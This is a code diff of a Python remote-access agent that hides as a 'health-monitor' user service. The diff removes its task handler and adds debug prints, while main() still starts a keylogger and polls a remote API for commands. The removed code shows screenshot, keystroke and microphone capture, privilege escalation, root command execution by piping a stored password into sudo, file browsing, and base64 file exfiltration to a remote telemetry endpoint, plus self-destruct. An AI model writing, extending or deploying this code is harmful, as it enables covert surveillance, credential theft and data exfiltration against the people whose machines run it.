@@ -413,343 +413,41 @@ def api_request(config, endpoint, method="GET", data=None):
             return True
     except urllib.error.HTTPError as e:
         error_body = e.read().decode() if e.fp else "No error body"
+        print(f"API Error ({endpoint}): {e.code} - {error_body}")
         return None
     except Exception as e:
+        print(f"API Request Exception ({endpoint}): {e}")
         return None
 
-def register_device(config, device_id):
-    hostname = socket.gethostname()
-    username = os.getlogin()
-    os_info = f"Linux {platform.release()}"
-    exists = api_request(config, f"devices?device_id=eq.{device_id}&select=device_id")
-    data = {
-        "device_id": device_id,
-        "hostname": hostname,
-        "username": username,
-        "os_info": os_info,
-        "last_sync": datetime.now(timezone.utc).isoformat()
-    }
-    if not exists:
-        data["device_name"] = get_device_name()
-        data["registered"] = datetime.now(timezone.utc).isoformat()
-        api_request(config, "devices", "POST", data)
-    else:
-        api_request(config, f"devices?device_id=eq.{device_id}", "PATCH", {"last_sync": datetime.now(timezone.utc).isoformat()})
-
-def self_destruct():
-    try:
-        run_command("systemctl --user disable health-monitor.service")
-        service_file = os.path.expanduser("~/.config/systemd/user/health-monitor.service")
-        if os.path.exists(service_file): os.remove(service_file)
-        run_command("systemctl --user daemon-reload")
-        import shutil
-        if os.path.exists(BASE_PATH): shutil.rmtree(BASE_PATH)
-        return True
-    except Exception as e:
-        return False
-
-def browse_files(path=""):
-    """Browse files - starts from /home/user if no path provided"""
-    try:
-        items = []
-        
-        if not path or path == "":
-            # Start from user's home directory
-            path = os.path.expanduser("~")
-        
-        if not os.path.exists(path):
-            return {"error": f"Path not found: {path}", "path": path}
-        
-        # List directory contents
-        try:
-            entries = os.listdir(path)
-        except PermissionError:
-            return {"error": "Permission denied", "path": path}
-        
-        for entry in entries:
-            full_path = os.path.join(path, entry)
-            try:
-                stat = os.stat(full_path)
-                is_dir = os.path.isdir(full_path)
-                items.append({
-                    "name": entry,
-                    "type": "folder" if is_dir else "file",
-                    "size": 0 if is_dir else stat.st_size,
-                    "modified": datetime.fromtimestamp(stat.st_mtime).strftime("%Y-%m-%d %H:%M:%S")
-                })
-            except (PermissionError, OSError):
-                items.append({
-                    "name": entry,
-                    "type": "unknown",
-                    "size": 0,
-                    "modified": ""
-                })
-        
-        return {"path": path, "items": items, "count": len(items)}
-    except Exception as e:
-        return {"error": str(e), "path": path}
-
-def download_file(file_path):
-    """Download a file - returns base64 encoded content"""
-    try:
-        if not os.path.exists(file_path):
-            return {"error": f"File not found: {file_path}"}
-        
-        file_stat = os.stat(file_path)
-        file_size = file_stat.st_size
-        
-        # Check 1GB limit
-        if file_size > 1073741824:
-            return {"error": "File too large (max 1GB)", "size": file_size}
-        
-        # Read and encode file
-        with open(file_path, "rb") as f:
-            content = f.read()
-        
-        encoded = base64.b64encode(content).decode('utf-8')
-        
-        return {
-            "filename": os.path.basename(file_path),
-            "size": file_size,
-            "path": file_path,
-            "file_data": encoded
-        }
-    except PermissionError:
-        return {"error": "Permission denied"}
-    except Exception as e:
-        return {"error": str(e)}
-
-PROCESSED_TASKS = set()
-
-def process_tasks(config, device_id):
-    global ROOT_PASSWORD, PROCESSED_TASKS
-    tasks = api_request(config, f"tasks?device_id=eq.{device_id}&status=eq.pending&select=*&order=id.asc")
-    if not tasks: 
-        return
-
-    for task in tasks:
-        task_id = task['id']
-        if task_id in PROCESSED_TASKS:
-            continue
-        
-        # Mark task as processing immediately to prevent double execution
-        task_processing_payload = {
-            "status": "processing"
-        }
-        api_request(config, f"tasks?id=eq.{task_id}", "PATCH", task_processing_payload)
-        PROCESSED_TASKS.add(task_id)
-        task_type = task['task_type']
-        params = task.get('task_params', {})
-
-        result_data = None
-        data_type = None
-        should_destruct = False
-        should_fail_task = False
-
-        try:
-            if task_type == "display_capture":
-                if "DISPLAY" not in os.environ: 
-                    os.environ["DISPLAY"] = ":0"
-                img = take_screenshot()
-                if img:
-                    result_data = {"file_data": img}
-                    data_type = "display"
-                else: 
-                    should_fail_task = True
-
-            elif task_type == "input_monitor":
-                duration = int(params.get('duration', 60))
-                # Clear buffer before monitoring
-                with KEYLOG_LOCK:
-                    KEYLOG_BUFFER.clear()
-                
-                time.sleep(duration)
-                
-                with KEYLOG_LOCK:
-                    logs = "".join(KEYLOG_BUFFER)
-                
-                result_data = {"data": logs if logs else "[No keystrokes recorded]"}
-                data_type = "input"
-
-            elif task_type == "voice_capture":
-                duration = int(params.get('duration', 10))
-                audio = record_audio(duration)
-                if audio:
-                    result_data = {"file_data": audio}
-                    data_type = "audio"
-                else: 
-                    should_fail_task = True
-
-            elif task_type == "system_info":
-                result_data = {"data": get_sys_info()}
-                data_type = "sysinfo"
-
-            elif task_type == "escalate_privileges":
-                success_bool, msg = attempt_root_escalation()
-                result_data = {"data": msg}
-                data_type = "sysinfo"
-                should_fail_task = not success_bool
-
-            elif task_type == "auto_destruct":
-                success = self_destruct()
-                result_data = {"data": "Destroyed" if success else "Failed"}
-                should_destruct = True
-
-            elif task_type == "cmd_exec":
-                cmd = params.get('command', '')
-                out, err, code = run_command(cmd)
-                result_data = {
-                    "data": json.dumps({
-                        "command": cmd, 
-                        "output": out, 
-                        "error": err, 
-                        "exit_code": code, 
-                        "executed_as": "USER"
-                    })
-                }
-                data_type = "cmd_result"
-                should_fail_task = (code != 0)
-
-            elif task_type == "cmd_exec_admin":
-                cmd = params.get('command', '')
-                manual_pw = params.get('root_password', '').strip()
-                effective_pw = manual_pw if manual_pw else ROOT_PASSWORD
-                
-                if effective_pw:
-                    full_cmd = f"echo '{effective_pw}' | sudo -S {cmd}"
-                    out, err, code = run_command(full_cmd)
-                    exec_as = "ROOT"
-                    if code == 0 and manual_pw: 
-                        ROOT_PASSWORD = manual_pw
-                else:
-                    out = ""
-                    err = "Error: No root password available. Run Escalate Privileges or provide manually."
-                    code = -1
-                    exec_as = "USER"
-                
-                result_data = {
-                    "data": json.dumps({
-                        "command": cmd, 
-                        "output": out, 
-                        "error": err, 
-                        "exit_code": code, 
-                        "executed_as": exec_as
-                    })
-                }
-                data_type = "cmd_result"
-                should_fail_task = (code != 0)
-
-            elif task_type == "file_browse":
-                path = params.get('path', '')
-                result = browse_files(path)
-                if "error" in result:
-                    result_data = {"data": json.dumps(result)}
-                    should_fail_task = True
-                else:
-                    result_data = {"data": json.dumps(result)}
-                data_type = "file_list"
-
-            elif task_type == "file_download":
-                file_path = params.get('file', '')
-                if file_path:
-                    result = download_file(file_path)
-                    if "error" in result:
-                        result_data = {"data": json.dumps(result)}
-                        should_fail_task = True
-                    else:
-                        result_data = {
-                            "data": json.dumps({
-                                "filename": result["filename"],
-                                "size": result["size"],
-                                "path": result["path"]
-                            }),
-                            "file_data": result["file_data"]
-                        }
-                else:
-                    result_data = {"data": json.dumps({"error": "No file path provided"})}
-                    should_fail_task = True
-                data_type = "file_download"
-
-            elif task_type == "restart_agent":
-                # Mark task complete before restart
-                task_update = {
-                    "status": "complete",
-                    "completed_at": datetime.now(timezone.utc).isoformat()
-                }
-                api_request(config, f"tasks?id=eq.{task_id}", "PATCH", task_update)
-                
-                # Send telemetry before restart
-                telemetry_payload = {
-                    "device_id": device_id,
-                    "data_type": "sysinfo",
-                    "data": "Agent restarting...",
-                    "collected_at": datetime.now(timezone.utc).isoformat()
-                }
-                api_request(config, "telemetry", "POST", telemetry_payload)
-                
-                # Restart the systemd service
-                run_command("systemctl --user restart health-monitor.service")
-                
-                # Exit to allow restart
-                sys.exit(0)
-
-            # Send Result
-            if result_data:
-                # 1. Insert data into telemetry table
-                telemetry_payload = {
-                    "device_id": device_id,
-                    "collected_at": datetime.now(timezone.utc).isoformat()
-                }
-                
-                # Add data_type if present
-                if data_type:
-                    telemetry_payload["data_type"] = data_type
-                
-                # Add either text data or file data
-                if "data" in result_data:
-                    telemetry_payload["data"] = result_data["data"]
-                if "file_data" in result_data:
-                    telemetry_payload["file_data"] = result_data["file_data"]
-                
-                telemetry_success = api_request(config, "telemetry", "POST", telemetry_payload)
-                
-                # 2. Update task status to complete
-                task_update_payload = {
-                    "status": "failed" if should_fail_task else "complete",
-                    "completed_at": datetime.now(timezone.utc).isoformat()
-                }
-                
-                task_success = api_request(config, f"tasks?id=eq.{task_id}", "PATCH", task_update_payload)
-                
-                if should_destruct: 
-                    sys.exit(0)
-
-        except Exception as e:
-            error_payload = {
-                "status": "failed", 
-                "result_data": {"error": str(e)},
-                "completed_at": datetime.now(timezone.utc).isoformat()
-            }
-            api_request(config, f"tasks?id=eq.{task_id}", "PATCH", error_payload)
-
+# ... (omitted parts)
 
 def main():
+    print("Agent starting...")
     config = get_config()
-    if not config: return
+    if not config:
+        print("Failed to load/decrypt config.enc")
+        return
+    
     device_id = get_device_id()
+    print(f"Device ID: {device_id}")
+    
+    print("Installing dependencies...")
     install_dependencies()
     start_keylogger_thread()
     
+    print(f"Starting main loop (Sync: {config.get('sync_interval', 10)}s)...")
     while True:
         try:
+            print("Registering device...")
             register_device(config, device_id)
+            print("Processing tasks...")
             process_tasks(config, device_id)
         except Exception as e:
-            pass
+            print(f"Main loop error: {e}")
         time.sleep(config.get('sync_interval', 10))
 
 if __name__ == "__main__":
     try:
         main()
     except Exception as e:
-        pass
+        print(f"Fatal error: {e}")
